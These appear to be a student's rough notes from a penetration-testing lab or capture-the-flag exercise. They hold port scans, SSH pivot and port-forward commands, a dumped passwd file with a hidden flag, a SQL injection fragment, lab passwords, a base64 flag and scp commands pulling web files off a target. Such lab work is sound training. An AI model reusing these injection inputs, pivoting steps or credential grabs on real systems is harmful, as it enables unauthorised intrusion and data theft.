
192.168.150.X  
.225, .226, .227  
.226 and .227 have dns 53 open  

192.168.28.X  
.97, .98, .99, .100, .105, .111, .120  
.98 has 53  
.100 has 80, 2222 as ssh  
.105 has 21,23,2222 as ssh  
.111 has 80, 2222 ass ssh and 8080 as http  
.120 has 4242 as ssh  

student@lin-ops:~/Desktop/Security/192.168.28.105$ cat ServerInitialization   
PassTemporary  
loginfirst  
logout null bit  
houseBeatFliesLOW  
YourTempPassword  


## web Exploitation

97dGQEcQWgSxAzo
student@lin-ops:~/Desktop/Security$ ssh -MS /tmp/gray student@10.50.36.239
student@lin-ops:~/Desktop/Security$ ssh -S /tmp/gray gray -O forward -D9050
T1:10.100.28.40

Nmap scan report for 10.100.28.40
Host is up (0.0018s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
4444/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

80/tcp   open  http
| http-enum: 
|   /robots.txt: Robots file
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
4444/tcp open  krb524


10.100.28.55 ATOPIA



root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/bin/bash backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false billybob:x:1001:1001:you found me l3UNSgV6WlHnGfKPEU3J:/home/billybob:/bin/bash billybob:x:1001:1001:you found me l3UNSgV6WlHnGfKPEU3J:/home/billybob:/bin/bash



ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDATVcXTWhY1e69F6+ecZ4O8PxagGb49iOqq+ukjIg6YQh6AIIqJROoLZ+lzbKfS5bt3zFwcP2yGkC0TGMVclVC/ScYUBtFj7xuKv+CdDIIqej82yTVjLyvDiKSaEaz+bKqCEcWdggW1PP2Xcm7ZrpIsTryPCYo27ldhJEjY8MoOQ3iZZh3cVl5sOdUFSfenMHV6YfMhhrEGgPe2pFJOe24nmrcCxEn4UO+pK93UObhISBwhtsrXS6C0h9q3jgfQFHohAOlL8ycLFtVNgkLU70tOmeWCqG0K3V2lDWVyNOLgx+JPbswBhp1QWSos543+PFVmiRFgELcVBQn3o6OCN8j student@lin-ops






# SQL CTFDs

target: 10.100.28.48 known port 80

Keys to the Kingdom

extract flag.txt compressed/zip
basee64 - MTR1N3k2alg3N2M1RHN0YWhOSEoK


4nGfU     87s2V

```
student@lin-ops:~$ ssh -MS /tmp/gray student@10.50.36.239
student@lin-ops:~$ ssh -S /tmp/gray gray -O forward -D9050
student@lin-ops:~$ ssh -S /tmp/gray gray -O forward -L 1460:10.100.28.48:80
```

Hacker	GirthWorm

GirthWorm	password

GirthWorm@gmail.com

shadfskjfdh \',1);#\





# reverse engineering 
creds to 192.168.28.111
comrade::StudentWebExploitPassword
ssh port 2222

student@lin-ops:~$ scp -r -P 1440 comrade@127.0.0.1:/var/www/html/consulting/public_html/longTermStorage /home/student/Desktop/Security
C:\Users\student\Desktop\REExercise> scp -r student@10.50.31.3:/home/student/Desktop/Security/ C:\Users\student\Desktop\REExercise















